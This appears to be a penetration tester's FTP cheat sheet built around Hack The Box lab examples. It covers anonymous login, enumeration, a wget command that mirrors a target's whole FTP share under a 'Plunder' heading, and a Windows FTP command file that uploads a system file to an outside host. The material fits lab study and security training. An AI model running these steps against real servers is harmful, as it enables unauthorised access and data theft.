#FTP #FileTransferProtocol

- List of FTP Commands [Secure File Sharing & FTP Hosting for Enterprise | SmartFile](https://www.smartfile.com/blog/the-ultimate-ftp-commands-list)
- https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes

|**Commands**|**Description**|
|---|---|
|`connect`|Sets the remote host, and optionally the port, for file transfers.|
|`get`|Transfers a file or set of files from the remote host to the local host.|
|`put`|Transfers a file or set of files from the local host onto the remote host.|
|`quit`|Exits tftp.|
|`status`|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
|`verbose`|Turns verbose mode, which displays additional information during file transfer, on or off.|

Connect
- FTP {Target IP}
- `ftp -nv {Target IP}` connect without prompt for no user/password
- if prompted for username
	- userid - anonymous
	- password - anonymous@domain.com

Enumeration
- Use status for server overview
- debug to turn debug on to get more information on files
- trace to turn packet tracing on
- ls to list files, note the contents and permissions (ls -R for recursive)
- Are use IDs listed? (Can be configured to be masked)
- run nmap FTP scripts against target
- run metasploit FTP aux scanner against target

Plunder
- `get {dir}\{filename}` transfer/download to the local directory that terminal was in before connecting to FTP
- `wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136` this will download all available files to local directory set in terminal

Attack
- put {filename} # upload a file to FTP server, such as an enumeration script
- run nmap FTP scripts that are attack scripts # find / -type f -name ftp* 2>/dev/null | grep scripts


SSL FTP
- openssl s_client -connect 10.129.14.136:21 -starttls ftp # connect to FTP that is using SSL/TLS
- Cert might have hostname/domain




#### Create a Command File for the FTP Client and Download the Target File
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```



#### Create a Command File for the FTP Client to Upload a File
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```